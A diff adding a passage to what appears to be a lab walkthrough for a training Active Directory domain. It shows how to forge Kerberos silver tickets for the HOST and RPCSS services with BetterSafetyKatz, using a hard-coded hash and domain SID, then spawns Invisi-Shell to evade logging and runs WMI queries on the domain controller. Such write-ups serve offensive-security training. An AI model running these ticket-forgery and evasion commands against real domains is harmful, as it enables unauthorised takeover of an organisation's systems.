@@ -1286,3 +1286,57 @@ schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "sec-fortress"
 
 
 ![](https://i.imgur.com/2uJ6umQ.png)
+
+> All of this is for the `/service:HOST`, now let also look at `/service:RPCSS`
+
+
+**For accessing `WMI`, we need to create two tickets - one for `HOST` service and another for `RPCSS`.**
+
+- Run the below commands from an elevated shell:
+
+
+```powershell
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:f5a2cef076a16742b123b8ed07c372c1 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+
+
+# Then confirm if you have access to scheduled task
+schtasks /S dcorp-dc.dollarcorp.moneycorp.local
+```
+
+
+- Inject a ticket for `RPCSS`:
+
+```powershell
+ C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:f5a2cef076a16742b123b8ed07c372c1 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+```
+
+- Check if the tickets are present, **_Desired Output -:_**
+
+```powershell
+klist
+```
+
+![](https://i.imgur.com/IRLpTXp.png)
+
+
+
+- Now, try running `WMI` commands on the domain controller:
+
+
+```powershell
+# Spawn invisi-shell
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+
+# Run command on DC
+Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc
+```
+
+
+**_Example_**
+
+
+
+![](https://i.imgur.com/vDOFHbG.png)
+
+
+
